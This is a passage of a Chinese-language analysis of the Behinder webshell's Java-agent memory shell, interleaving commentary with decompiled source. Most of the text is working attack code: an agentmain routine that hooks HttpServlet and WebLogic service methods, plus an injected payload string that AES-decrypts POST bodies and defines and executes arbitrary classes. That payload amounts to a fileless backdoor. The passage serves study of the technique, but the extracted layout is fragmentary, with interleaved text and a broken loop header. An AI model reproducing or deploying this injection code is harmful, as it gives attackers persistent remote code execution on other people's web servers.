            int var11 = roots.length;
            for(int var12 = 0; var12 = 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", 
(Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", 
byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
在注入内存马的时候我们是没有办法获取到 pageContext 对象的，所以新版的冰蝎添加了一个新
的方案，也就是 this.fillContext(obj) 方法的内容。如果传递的不是 pageContext 对象，那
就可以通过 HashMap 将需要的三个参数存进去。而之后我们自定义代码也是通过这种方法实现
的。
冰蝎内存马的实现分析
冰蝎内存马的实现使用了一种新的内存马 java agent ，这个非常值得学习一下原理，所以这里也
分析一下。关于 javaagent 技术的学习可以看《java基础知识的javaagent篇》。总的来说就是通
过 javaagent 的 agentMain 去 hook tomcat 的相关函数来达到修改字节码的效果。
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", 
byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }
         sb.append(value);
         sb.append("\",");
      }
      sb.setLength(sb.length() - 1);
      sb.append("}");
      return sb.toString();
   }
   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }
      this.Response.getClass().getMethod("setCharacterEncoding", 
String.class).invoke(this.Response, "UTF-8");
   }
}
客户端入口
可以看到此处会根据系统类型的不同，上传不同的 agent 包，然后调用 loadJar 方法加载这个上
传的 Jar 包。 
在加载包之后执行 shellService.injectMemShell() 方法，然后就是之前的操作了，现在来关
注功能执行的代码 Memshell，java
Memshell.java#equals()->doAgentShell()  
此处有一个点就是关于 jdk.attach.allowAttachSelf ，jdk9之后不允许了，所以此处需要提前
修改设置。还有其他的修改方案。议题解析与复现--《Java内存攻击技术漫谈》（一) 
此处通过反射加载之前已经上传的 agent ，然后会触发 agent 当中的 Agent-Class: 
net.rebeyond.behinder.payload.java.MemShell#agentmain() 方法。这个 libPath 还是看
上传功能的实现。
agentmain 方法
Class[] cLasses = inst.getAllLoadedClasses(); //当前jvm加载的所有类
      byte[] data = new byte[0];
      Map targetClasses = new HashMap();
      Map targetClassJavaxMap = new HashMap();
      targetClassJavaxMap.put("methodName", "service");
      List paramJavaxClsStrList = new ArrayList();
      paramJavaxClsStrList.add("javax.servlet.ServletRequest");
      paramJavaxClsStrList.add("javax.servlet.ServletResponse");
      targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      Map targetClassJakartaMap = new HashMap();  //这一个处理是为了忽略tomcat改变带
来的包名变化
      targetClassJakartaMap.put("methodName", "service");
      List paramJakartaClsStrList = new ArrayList();
      paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
      paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
      targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      targetClasses.put("jakarta.servlet.http.HttpServlet", 
targetClassJakartaMap);
      String getCoreObject = "javax.servlet.http.HttpServletRequest request=
(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse 
response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession 
session = request.getSession();\n";
      ClassPool cPool = ClassPool.getDefault();
      if (ServerDetector.isWebLogic()) {
         targetClasses.clear();
         Map targetClassWeblogicMap = new HashMap();
         targetClassWeblogicMap.put("methodName", "execute");
         List paramWeblogicClsStrList = new ArrayList();
         paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
         paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
         targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
         targetClasses.put("weblogic.servlet.internal.ServletStubImpl", 
targetClassWeblogicMap);
      }
      String shellCode = "javax.servlet.http.HttpServletRequest request=
(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse 
response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession 
session = request.getSession();\nString pathPattern=\"%s\";\nif 
(request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new 
java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",re
sponse);\n\tobj.put(\"session\",session);\n    ClassLoader 
loader=this.getClass().getClassLoader();\n\tif 
(request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString 
k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader 
systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass 
cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject 
c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]
{String.class}).invoke((java.lang.Object)cipherCls,new Object[]
{\"AES\"});\n\t\t\tObject 
keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredCo
nstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]
{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method 
initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]
{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.in
voke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method 
doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]
{byte[].class});\n            byte[] requestBody=null;\n            try {\n       
             Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t 
       Object Decoder = Base64.newInstance();\n                    requestBody=
(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n 
               } catch (Exception ex) \n                {\n                    
Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    
Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new 
Class[0]).invoke(null, new Object[0]);\n                    requestBody=
(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n 
               }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=
(byte[])doFinalMethod.invoke(c,new Object[]
{requestBody});\n\t\t\tjava.lang.reflect.Method 
defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new 
Class[]
{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\
n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor 
constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new 
Class[]
{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tj
ava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new 
Object[]{loader});\n\t\t\tjava.lang.Class  c=
(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]
{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\
n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   
e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error 
error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
      Class[] var28 = cLasses;
      int var13 = cLasses.length;
      for(int var14 = 0; var14 < var13; ++var14) {
         Class cls = var28[var14];
         if (targetClasses.keySet().contains(cls.getName())) {  //所有加载的类对象如
果存在javax.servlet.http.HttpServlet
            String targetClassName = cls.getName();
这个 agentMain 方法其实很简单，就是遍历加载的全部类，然后 Hook 
javax.servlet.http.HttpServlet 这个类（不同的中间件，不同的版本可能存在差别），然后
修改他的 service() 方法。我们把他扒出来单独找份 tomcat 来跑一下，看看被修改后的
HttpServlet 类
shellcode 变量的内容
            try {